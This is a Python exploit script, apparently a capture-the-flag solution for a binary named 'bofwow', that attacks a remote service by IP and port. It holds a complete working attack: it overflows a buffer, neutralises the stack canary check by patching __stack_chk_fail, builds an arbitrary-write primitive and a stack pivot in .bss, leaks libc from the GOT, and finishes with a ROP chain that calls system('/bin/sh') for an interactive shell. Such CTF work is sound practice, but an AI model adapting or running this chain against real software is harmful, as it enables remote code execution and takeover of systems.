#!/usr/bin/env python3
from ptrlib import *

elf = ELF('./bofwow')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF("./libc.so.6")

#io = Process('./bofwow')
io = remote('nc 34.170.146.252 15115')
io.debug = True
#io = remote('nc localhost 9003')

# in first BOF, __stack_chk_fail must be patched
# overwrite std::string ptr and patch __stack_chk_fail to "ret" gadget
io.sendlineafter("?", p64(next(elf.gadget("ret;"))) + p64(elf.symbol('main')) * ((0x130//8) - 1) + p64(elf.got('__stack_chk_fail')) + p64(0x300) + p64(0x300))
io.sendlineafter("?", 0)
# prepare "/bin/sh" string in bss (finaly didn't use, but if erase this, stack offset change)
io.sendlineafter("?", b"/bin/sh\x00" + p64(elf.symbol('main')) * ((0x130//8) - 1) + p64(elf.section(".bss") + 0x400) + p64(0x300) + p64(0x300))
io.sendlineafter("?", 0)

def aaw(addr, data):
    # overwrite std::string and write 8bytes data and return to main
    io.sendlineafter("?", data + p64(elf.symbol('main')) * ((0x130//8) - 1) + p64(addr) + p64(0x300) + p64(0x300))
    io.sendlineafter("?", 0)
    return
    
#input("> ")

'''
there are less useful gadget, so need libc address

after leak libc from GOT with main std::cout, destructor free the GOT region and cause SIGSEGV
therefore, destructor's GOT must be patched

destructor's GOT addr is 0x404020, this contains whitespace which can't enter from std::cout
so, I patch destructor's GOT from 0x40401f, but it destruct <std::istream::operator>>(int&)> GOT 0x404018

<std::istream::operator>>(int&)> is called after std::cin
so, I recover <std::istream::operator>>(int&)> GOT by std::cin
'''

# prepare stack pivot chain in bss region

# prepare stack pivot gadget in bss + 0x648
aaw(elf.section(".bss") + 0x648, p64(next(elf.gadget("pop rbp; ret;"))))
# "pop rbp; ret" pop this addr and further stack pivot
aaw(elf.section(".bss") + 0x650, p64(elf.section(".bss") + 0x700))

# if eax or esi can be controled, opeator int GOT region can overwrite by std::cin
# (eax to destructor GOT) gadget in bss 0x658
aaw(elf.section(".bss") + 0x658, p64(next(elf.gadget("mov eax, [rbp-0x18]; leave; ret;"))))
aaw(elf.section(".bss") + 0x700-0x18, p64(0x404018))

# fake std::string chunk ptr in bss + 0x600
aaw(elf.section(".bss") + 0x700, p64(elf.section(".bss") + 0x600))

# 0x401322 is address where std::cin 2nd arg is passed by "mov rsi, rax"
aaw(elf.section(".bss") + 0x700+0x8, p64(0x401322))

# after recover GOT region, return to main
aaw(elf.section(".bss") + 0x700+0x30, p64(elf.symbol('main')))

# construct fake std::string chunk ptr
aaw(elf.section(".bss") + 0x600, p64(0x404018)) 
aaw(elf.section(".bss") + 0x608, p64(0x8))


# patch 0x40401f and pivot to bss + 0x648 -> stack pivot chain
# std::string chunk ptr to bss + 0x600 -> libc leak
io.sendlineafter("?", p64((next(elf.gadget("ret;")) << 8) + 0x7f) + p64(elf.symbol('main')) * ((0x130//8) - 5) + p64(elf.section(".bss") + 0x600 + 0x40) + p64(next(elf.gadget("ret;"))) + p64(0x4013e0) + p64(elf.symbol('main')) + p64(0x40401f) + p64(0x300) + p64(0x300))
io.sendlineafter("?", 0)

# leak libc addr
io.recvuntil("Name: ")
libc.base = u64(io.recvline()) - 0x7f00000000368c00

# ROP -> call system("/bin/sh")
io.sendline(p64(next(libc.gadget("pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;")))[:-1])

payload = p64(next(libc.gadget("ret;"))) * 50
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol('system'))

io.sendlineafter("?", payload)
io.interactive()
